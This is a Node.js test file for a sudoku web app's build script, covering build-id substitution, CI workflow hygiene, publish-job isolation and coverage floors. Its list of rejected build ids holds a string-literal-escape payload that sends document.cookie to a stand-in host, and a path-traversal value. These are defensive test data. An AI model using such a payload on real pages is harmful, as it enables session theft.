import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { build, BUILD_ID_PATTERN, PLACEHOLDER } from '../scripts/build.mjs';

const root = join(import.meta.dirname, '..');

function fixture(t) {
  const dir = mkdtempSync(join(tmpdir(), 'sudoku-build-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));

  writeFileSync(join(dir, 'index.html'), `<!doctype html><meta name=b content=${PLACEHOLDER}>`);
  writeFileSync(join(dir, 'generator.js'), 'function makePuzzle() {}\n');
  writeFileSync(join(dir, 'sw.js'), `const CACHE = "sudoku-${PLACEHOLDER}";\n`);
  writeFileSync(join(dir, 'manifest.webmanifest'), `{"name":"s","id":"${PLACEHOLDER}"}`);
  mkdirSync(join(dir, 'icons'));
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe]);
  writeFileSync(join(dir, 'icons', 'app.png'), png);

  return { dir, out: join(dir, '_site'), png };
}

const read = (out, file) => readFileSync(join(out, file), 'utf8');

test('the build id replaces every __BUILD__ in every published text file', (t) => {
  const { dir, out, png } = fixture(t);

  const result = build({ root: dir, outDir: out, buildId: 'deadbeef1234' });

  assert.equal(result.buildId, 'deadbeef1234');
  assert.equal(result.idSource, 'BUILD_ID');

  const counts = Object.fromEntries(result.files.map((f) => [f.path, f.substitutions]));
  assert.deepEqual(counts, {
    'index.html': 1,
    'generator.js': 0,
    'manifest.webmanifest': 1,
    'sw.js': 1,
    'icons/app.png': 0,
  });

  assert.equal(read(out, 'sw.js'), 'const CACHE = "sudoku-deadbeef1234";\n');
  assert.equal(JSON.parse(read(out, 'manifest.webmanifest')).id, 'deadbeef1234');
  for (const file of ['index.html', 'sw.js', 'manifest.webmanifest']) {
    assert.equal(
      read(out, file).includes(PLACEHOLDER),
      false,
      `${file} still holds ${PLACEHOLDER} after the build`,
    );
  }
  assert.deepEqual(readFileSync(join(out, 'icons', 'app.png')), png);
});

test('a build id that could break out of a string literal is refused', (t) => {
  const { dir, out } = fixture(t);

  const rejected = [
    'x"; fetch("https://evil.example/" + document.cookie); //',
    'abc\ndef',
    '../../etc',
    'a b',
    "it's",
    '-leading-dash',
    'x'.repeat(65),
  ];

  for (const id of rejected) {
    assert.equal(BUILD_ID_PATTERN.test(id), false, `${JSON.stringify(id)} should not match`);
    assert.throws(
      () => build({ root: dir, outDir: out, buildId: id }),
      /refusing to publish with BUILD_ID/u,
      `build accepted ${JSON.stringify(id)}`,
    );
  }

  assert.equal(BUILD_ID_PATTERN.test('0123456789abcdef0123456789abcdef01234567'), true);
});

test('every job that builds the site installs what the build imports', () => {
  const source = readFileSync(join(root, 'scripts', 'build.mjs'), 'utf8');
  const specifiers = [...source.matchAll(/\bfrom\s+'([^']+)'/gu)].map((m) => m[1]);

  assert.ok(specifiers.length > 0, 'found no imports at all, so this check read the wrong file');
  const external = specifiers.filter((s) => !s.startsWith('node:'));

  /* Every external import has to be a declared devDependency. A package that
     resolves locally because something else happened to hoist it into
     node_modules is not installed by npm ci on a clean runner. */
  const { devDependencies = {} } = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const undeclared = external.filter((name) => !Object.hasOwn(devDependencies, name));
  assert.deepEqual(
    undeclared,
    [],
    'scripts/build.mjs imports packages that package.json does not declare, so npm ci will ' +
      `not install them:\n  ${undeclared.join('\n  ')}`,
  );

  if (external.length === 0) return;

  const workflows = join(root, '.github', 'workflows');
  for (const name of readdirSync(workflows)) {
    const yaml = readFileSync(join(workflows, name), 'utf8');
    for (const [, job] of yaml.matchAll(/^ {2}([\w-]+):$/gmu)) {
      const start = yaml.indexOf(`\n  ${job}:`);
      const next = yaml.slice(start + 1).search(/\n {2}[\w-]+:$/mu);
      const body = next === -1 ? yaml.slice(start) : yaml.slice(start, start + 1 + next);
      if (!/run:\s*npm run build/u.test(body)) continue;
      assert.match(
        body,
        /run:\s*npm ci/u,
        `${name}: the "${job}" job runs npm run build but never installs, and the build now ` +
          `imports ${external.join(', ')} from node_modules, so the publish step crashes`,
      );
    }
  }
});

test('the job holding the publish credentials runs no third party code', () => {
  const workflow = readFileSync(join(root, '.github/workflows/deploy-pages.yml'), 'utf8');

  // MUST KILL: jobs are sliced out of the YAML with a regex and a lookahead tail, so a real YAML parser would remove the \Z trap
  const jobs = [...workflow.matchAll(/^ {2}([\w-]+):\n([\s\S]*?)(?=^ {2}[\w-]+:|$(?![\s\S]))/gmu)]
    .map(([, name, body]) => ({ name, body }))
    .filter(({ body }) => /^ {6}pages:\s*write/mu.test(body));

  assert.equal(jobs.length, 1, 'exactly one job should hold pages: write');

  const { name, body } = jobs[0];
  for (const [pattern, what] of [
    [/uses:\s*actions\/checkout/u, 'checks out the repository'],
    [/uses:\s*actions\/setup-node/u, 'installs node'],
    [/run:\s*npm /u, 'runs npm'],
  ]) {
    assert.ok(
      !pattern.test(body),
      `the "${name}" job holds pages: write and ${what}. Build the artifact in ` +
        'Verify and let this job only deploy it, so the dependency tree never sits ' +
        'beside the publish credentials.',
    );
  }

  for (const [, action] of body.matchAll(/uses:\s*([^@\s]+)@/gu)) {
    assert.ok(
      action.startsWith('actions/'),
      `the "${name}" job uses ${action}, which is not a GitHub owned action`,
    );
  }
});

test('the test:coverage script still asks node to enforce a coverage floor', () => {
  const { scripts = {} } = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const script = scripts['test:coverage'] ?? '';

  assert.match(
    script,
    /--experimental-test-coverage\b/u,
    'the "test:coverage" script no longer enables coverage, so node accepts the thresholds ' +
      'below, measures nothing and exits 0',
  );

  for (const [metric, floor] of [
    ['lines', 90],
    ['branches', 88],
    ['functions', 90],
  ]) {
    const asked = [
      ...script.matchAll(new RegExp(`--test-coverage-${metric}[= ](\\d+(?:\\.\\d+)?)`, 'gu')),
    ];
    assert.ok(
      asked.length > 0,
      `the "test:coverage" script no longer passes --test-coverage-${metric}, so ${metric} ` +
        'coverage is measured and then ignored',
    );
    const effective = asked.at(-1)[1];
    assert.ok(
      Number(effective) >= floor,
      `--test-coverage-${metric} is ${effective}, below the ${floor} this repository already met`,
    );
  }
});
